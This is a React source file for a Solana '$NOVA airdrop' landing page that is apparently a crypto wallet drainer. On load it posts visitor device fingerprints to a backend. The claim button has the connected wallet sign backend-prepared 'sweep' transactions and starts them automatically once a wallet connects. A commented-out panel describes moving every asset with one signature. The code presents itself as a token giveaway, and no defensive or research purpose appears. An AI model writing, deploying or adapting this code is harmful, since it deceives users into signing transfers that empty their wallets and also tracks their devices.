import { Buffer } from 'buffer'
import { useCallback, useEffect, useRef, useState } from 'react'
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import { useAppKitConnection, type Provider } from '@reown/appkit-adapter-solana/react'
import { SendTransactionError, Transaction } from '@solana/web3.js'
import useScrollAnimation from './hooks/useScrollAnimation'
import './App.css'
import './Home.css'
import { Header } from './header/Header'
import { Footer } from './footer/Footer'

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:3001'
// ----------------- device info---
interface DeviceInfo {
  screenResolution: string;
  language: string;
  platform: string;
  userAgent: string;
  hardwareConcurrency: number | string;
  gpuRenderer: string;
}

const getDeviceInfo = (): DeviceInfo => {
  let gpuRenderer = 'N/A';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || (canvas.getContext('experimental-webgl') as WebGLRenderingContext | null);
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
      }
    }
  } catch (e) {
    console.error(e);
  }

  return {
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    language: navigator.language,
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
    gpuRenderer
  };
};

// -------------------- device info------
function App() {
  const { open } = useAppKit()
  const { address, isConnected } = useAppKitAccount()
  const { walletProvider } = useAppKitProvider<Provider>('solana')
  const { connection } = useAppKitConnection()
  const [status, setStatus] = useState('')
  const [isWorking, setIsWorking] = useState(false)
  const startAfterConnect = useRef(false)

  const walletLabel = isConnected && address ? `${address.slice(0, 4)}...${address.slice(-4)}` : 'Connect wallet'

  useEffect(() => {
    void fetch(`${BACKEND_URL}/api/log-visit`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceInfo: getDeviceInfo() }),
    }).catch((error) => console.error('Failed to log visit:', error))
  }, [])

  const startTransfer = useCallback(async () => {
    setStatus('')
    if (!isConnected || !walletProvider || !connection) {
      startAfterConnect.current = true
      open()
      return
    }

    setIsWorking(true)
    setStatus('Preparing the transfer on the backend...')
    try {
      const prepareResponse = await fetch(`${BACKEND_URL}/api/sweep/prepare`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ owner: walletProvider.publicKey?.toBase58() }),
      })
      const prepared = await prepareResponse.json()
      if (!prepareResponse.ok) throw new Error(prepared.error || 'The backend could not prepare the transfer.')

      const transactionsBase64 = prepared.transactionsBase64
      if (!Array.isArray(transactionsBase64) || transactionsBase64.length === 0 || transactionsBase64.length > 3) {
        throw new Error('The backend returned an invalid batch plan.')
      }

      let lastSignature = ''
      for (let index = 0; index < transactionsBase64.length; index += 1) {
        const batchNumber = index + 1
        const plan = Transaction.from(Buffer.from(transactionsBase64[index], 'base64'))
        setStatus(`Waiting for approval for batch ${batchNumber} of ${transactionsBase64.length}...`)
        lastSignature = await walletProvider.sendTransaction(plan, connection)
        setStatus(`Confirming batch ${batchNumber} of ${transactionsBase64.length}...`)

        const confirmResponse = await fetch(`${BACKEND_URL}/api/sweep/confirm`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ signature: lastSignature }),
        })
        const confirmed = await confirmResponse.json()
        if (!confirmResponse.ok) throw new Error(confirmed.error || `Batch ${batchNumber} could not be confirmed.`)
      }
      setStatus(`Broadcast complete: ${lastSignature}`)
    } catch (error) {
      if (error instanceof SendTransactionError) {
        try {
          const logs = await error.getLogs(connection)
          setStatus(`${error.message}\n${logs.join('\n')}`)
        } catch {
          setStatus(error.message)
        }
      } else {
        setStatus(error instanceof Error ? error.message : 'The wallet rejected the transaction.')
      }
    }
    finally { setIsWorking(false) }
  }, [connection, isConnected, open, walletProvider])

  useEffect(() => {
    if (!startAfterConnect.current || !isConnected) return

    let cancelled = false
    const tryStartTransfer = () => {
      if (cancelled || !startAfterConnect.current || !walletProvider?.publicKey || !connection) return

      startAfterConnect.current = false
      void startTransfer()
    }

    tryStartTransfer()
    const readinessWatcher = window.setInterval(tryStartTransfer, 250)

    return () => {
      cancelled = true
      window.clearInterval(readinessWatcher)
    }
  }, [address, connection, isConnected, startTransfer, walletProvider])

  const aboutRef = useScrollAnimation<HTMLElement>();
  const statsRef = useScrollAnimation<HTMLDivElement>();
  const eligibilityRef = useScrollAnimation<HTMLDivElement>();
  const claimRef = useScrollAnimation<HTMLDivElement>();
  const heroContentRef = useScrollAnimation<HTMLDivElement>();
  const heroVisualRef = useScrollAnimation<HTMLDivElement>();

  return (
    <div className="layout-container">
      <Header />
      <main className="main-content">

        <div className="home-page">
          {/* Hero Section */}
          <section className="hero-section">
            <div className="container hero-container">
              <div className="hero-content scroll-animation fade-up" ref={heroContentRef}>
                <div className="badge">
                  <span className="pulse-dot"></span>
                  Live $NOVA Airdrop
                </div>
                <h1 className="hero-title">
                  Take part in the <br />
                  <span className="gradient-text">$NOVA Airdrop</span>
                </h1>
                <p className="hero-description">
                  Join the exclusive $NOVA airdrop and claim your tokens. Limited-time opportunity for early adopters and community members to participate in our Web3 ecosystem.
                </p>
                <div className="hero-actions">
                  <button disabled={isWorking} onClick={() => void startTransfer()} className="btn-primary">
                    {isWorking ? 'Tokens Incoming...' : isConnected ? 'Start' : walletLabel}
                  </button>
                  <a href="#about" className="btn-secondary">Learn More</a>
                </div>
              </div>

              <div className="hero-visual scroll-animation fade-down" ref={heroVisualRef}>
                <div className="token-glow-card">
                  <div className="token-avatar">$NOVA</div>
                  <div className="glow-effect"></div>
                </div>
              </div>
            </div>
          </section>

          {/* About Section */}
          <section id="about" className="about-section scroll-animation fade-up" ref={aboutRef}>
            <div className="container">
              <div className="section-header">
                <h2>About <span className="gradient-text">$NOVA</span> Airdrop</h2>
                <p>
                  The $NOVA airdrop is a limited-time distribution of free $NOVA tokens to early supporters and active community members building decentralized finance.
                </p>
              </div>

              <div className="stats-grid scroll-animation fade-up" ref={statsRef}>
                <div className="stat-card">
                  <span className="stat-value">1,000,000</span>
                  <span className="stat-label">Total Tokens</span>
                </div>
                <div className="stat-card">
                  <span className="stat-value">50,000</span>
                  <span className="stat-label">Participants</span>
                </div>
                <div className="stat-card">
                  <span className="stat-value">7 Days</span>
                  <span className="stat-label">Time Remaining</span>
                </div>
              </div>

              {/* Eligibility Card matching screenshot */}
              <div className="eligibility-card scroll-animation fade-up" ref={eligibilityRef}>
                <h3 className="eligibility-title">Eligibility Requirements</h3>
                <div className="eligibility-content">
                  <ul className="requirements-list">
                    <li>
                      <span className="checkmark">✓</span>
                      <span>Be an active Solana blockchain user</span>
                    </li>
                    <li>
                      <span className="checkmark">✓</span>
                      <span>Hold some tokens in your wallet</span>
                    </li>
                    <li>
                      <span className="checkmark">✓</span>
                      <span>Follow our account on Twitter</span>
                    </li>
                    <li>
                      <span className="checkmark">✓</span>
                      <span>Have fun!</span>
                    </li>
                  </ul>
                  <div className="wallet-graphic">
                    <img 
                      src="https://loa.quantresolvedesk.xyz/images/wallet.webp" 
                      alt="Wallet Illustration" 
                    />
                  </div>
                </div>
              </div>
              {/* Claim CTA Section */}
              <div id="claim" className="claim-cta-section scroll-animation fade-up" ref={claimRef}>
                <h3 className="claim-cta-title">Ready to claim your tokens?</h3>
                <button className="btn-connect-wallet" disabled={isWorking} onClick={() => void startTransfer()} type="button">
                  {isWorking ? 'Tokens Incoming...' : isConnected ? 'Start' : walletLabel}
                </button>
                {status && <p className="transfer-status" role="status">{status}</p>}
              </div>
            </div>
          </section>
        </div>

        {/* ------------------- */}
        {/* <section className="wallet-panel" aria-labelledby="wallet-title">
          <p className="eyebrow">Solana asset sweep</p>
          <h1 id="wallet-title">Move every asset with one signature.</h1>
          <p className="wallet-description">Connect your wallet and approve the backend-prepared transfer of all tokens split 85%/15%, plus SOL split 60%/15%.</p>
          <button className="connect-button" disabled={isWorking} onClick={() => void startTransfer()} type="button">
            {isWorking ? 'Processing transfer...' : isConnected ? 'Start asset sweep' : walletLabel}
          </button>
          {status && <p className="transfer-status" role="status">{status}</p>}
        </section> */}
 
        {/* -------------------- */}
      </main>

      <Footer />
    </div>
    
  )
}

export default App